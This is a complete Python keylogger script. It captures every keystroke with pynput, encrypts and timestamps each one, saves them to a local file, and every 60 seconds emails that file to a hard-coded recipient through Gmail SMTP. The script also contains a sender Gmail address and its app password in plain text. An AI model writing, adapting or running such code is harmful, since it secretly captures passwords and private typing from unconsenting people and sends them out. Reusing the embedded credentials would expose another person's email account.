from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import os
import smtplib
from email.message import EmailMessage
from threading import Timer
from datetime import datetime

log_file = "encrypted_keystrokes.txt"
key_file = "encryption.key"

sender_email = "girdharniketdigi@gmail.com"
receiver_email = "niketgirdhar2004@gmail.com"
email_password = "qfxx ugkd cmek wwgx"

smtp_server = "smtp.gmail.com"
smtp_port = 465

def load_key():
    if not os.path.exists(key_file):
        key = Fernet.generate_key()
        with open(key_file, "wb") as key_out:
            key_out.write(key)
    else:
        with open(key_file, "rb") as key_in:
            key = key_in.read()
    return Fernet(key)

fernet = load_key()

def log_encrypted(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    encrypted_data = fernet.encrypt(f"{timestamp} - {data}".encode())
    with open(log_file, "ab") as f:
        f.write(encrypted_data + b"\n")

def on_press(key):
    try:
        log_encrypted(str(key.char))
    except AttributeError:
        log_encrypted(f"[{key}]")

def send_log_email():
    if not os.path.exists(log_file):
        return

    msg = EmailMessage()
    msg["Subject"] = "Keylogger Logs"
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg.set_content("Attached are the encrypted keystroke logs with timestamps.")
    
    with open(log_file, "rb") as f:
        msg.add_attachment(f.read(), maintype="text", subtype="plain", filename=log_file)

    with smtplib.SMTP_SSL(smtp_server, smtp_port) as smtp:
        smtp.login(sender_email, email_password)
        smtp.send_message(msg)

    print("Log file sent via email.")

def schedule_email():
    send_log_email()
    Timer(60, schedule_email).start()

with Listener(on_press=on_press) as listener:
    schedule_email()
    listener.join()